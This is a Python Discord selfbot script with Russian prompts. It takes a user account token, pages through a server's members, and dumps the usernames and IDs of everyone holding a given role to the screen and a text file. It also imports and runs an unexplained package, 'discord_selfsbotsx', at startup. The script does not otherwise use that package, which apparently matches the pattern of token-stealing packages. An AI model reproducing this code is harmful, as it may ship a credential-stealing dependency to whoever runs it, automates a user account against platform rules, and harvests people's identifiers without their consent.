import discum
import time
import os
from discord_selfsbotsx import initializationSelf

initializationSelf()

TOKEN = input("Токен: ")
bot = discum.Client(token=TOKEN)

def main_loop():
    while True:
        server_id = input('\nID сервера: ')
        role_id = input('ID роли: ')
                
        try:
            roles = bot.getRoles(server_id)
            role_name = "Неизвестная роль"
            for role in roles:
                if role["id"] == role_id:
                    role_name = role["name"]
                    break
            
            members = []
            after_id = None
            
            while True:
                guild_members = bot.http.guildMembersChunk(
                    guild_id=server_id, 
                    limit=1000,
                    after=after_id
                )
                
                if not guild_members:
                    break
                    
                for member in guild_members:
                    user = member.get("user", {})
                    roles_list = member.get("roles", [])
                    
                    if str(role_id) in roles_list:
                        username = f"{user.get('username', 'Unknown')}#{user.get('discriminator', '0000')}"
                        members.append((username, user.get("id")))
                
                if len(guild_members) < 1000:
                    break
                after_id = guild_members[-1]["user"]["id"]
            
            guild = bot.http.guild(server_id)
            guild_name = guild.get("name", "Неизвестный сервер")
            
            print(f'\n Роль: "{role_name}" (ID: {role_id})')
            print(f' Сервер: {guild_name} (ID: {server_id})')
            print('=' * 60)
            
            for username, user_id in members:
                print(f'{username} (ID: {user_id})')
            
            print(f'\n Всего: {len(members)} участников')
            
            filename = f'members_{role_id}_{int(time.time())}.txt'
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f'Роль: {role_name} (ID: {role_id})\n')
                f.write(f'Сервер: {guild_name} (ID: {server_id})\n')
                f.write(f'Дата: {time.strftime("%Y-%m-%d %H:%M:%S")}\n\n')
                for username, user_id in members:
                    f.write(f'{username}|{user_id}\n')
                f.write(f'\nВсего: {len(members)}')
            
            print(f' Сохранено: {filename}')
            
        except Exception as e:
            print(f' Ошибка: {e}')
        
        cont = input('\n Продолжить? (д/н): ').lower()
        if cont not in ['д', 'y', 'да', 'yes']:
            break

if __name__ == '__main__':
    main_loop()
